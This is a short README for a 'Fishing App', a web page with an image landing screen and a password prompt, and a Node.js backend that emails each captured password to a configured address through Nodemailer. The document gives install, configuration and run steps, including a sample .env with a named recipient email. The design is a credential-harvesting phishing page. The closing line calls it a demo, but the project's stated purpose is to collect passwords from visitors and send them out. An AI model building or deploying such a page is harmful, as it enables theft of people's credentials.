# Fishing App

A simple HTML/CSS/JS website with a password page and a small Node.js backend that sends the captured password by email.

## Features

- Fullscreen image landing page
- Password input page
- Show/hide password toggle
- Node.js email backend using Nodemailer
- Environment-based email configuration

## Requirements

- Node.js 18+
- npm

## Install

```bash
npm install
```

## Configuration

Create a `.env` file based on `.env.example` and fill in your Gmail app password.

```env
EMAIL_USER=28zilbel@gnsmail.ca
EMAIL_PASS=your-16-char-gmail-app-password
TO_EMAIL=28zilbel@gnsmail.ca
PORT=3000
```

## Run locally

```bash
npm start
```

Then open:

```text
http://localhost:3000
```

## Notes

This project is intended for a simple demo or internal use. Be careful with password collection and never expose real secrets in a public repository.
